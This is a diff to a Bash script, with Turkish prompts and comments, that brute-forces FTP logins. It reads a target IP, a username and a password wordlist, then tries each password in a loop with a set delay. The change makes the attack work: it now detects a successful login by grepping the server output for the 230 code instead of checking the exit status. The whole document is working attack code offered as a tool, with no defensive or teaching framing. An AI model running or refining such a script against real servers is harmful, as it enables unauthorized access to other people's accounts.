@@ -15,7 +15,7 @@ read -p "Kelime dosyasının yolunu gir >> " word
 read -p "Kullanıcı adını gir >> " user
 
 # Hız seçimine göre gecikme ayarı
-case $hız in
+case "$hız" in
     fast)
         delay=0.5
         echo -e "${YELLOW}Hız: Fast seçildi.${NC}"
@@ -45,18 +45,20 @@ echo -e "${GREEN}Brute force saldırısı başlatılıyor...${NC}"
 while read -r password; do
     echo -e "${YELLOW}Deniyorum: $user / $password${NC}"
     
-    # FTP bağlantısını kontrol et
-    ftp -n -v $ip <<EOF > /dev/null 2>&1
+    # FTP bağlantısını kontrol et ve çıktıyı al
+    output=$(ftp -n -v $ip <<EOF
 open $ip
 user $user $password
 bye
 EOF
+)
 
-    # Eğer giriş başarılıysa
-    if [[ $? -eq 0 ]]; then
+    # FTP çıktısını kontrol et
+    if echo "$output" | grep -q "230"; then
         echo -e "${GREEN}Başarılı giriş! Kullanıcı: $user, Parola: $password${NC}"
         exit 0
     fi
+    
     sleep $delay
 done < "$word"
 
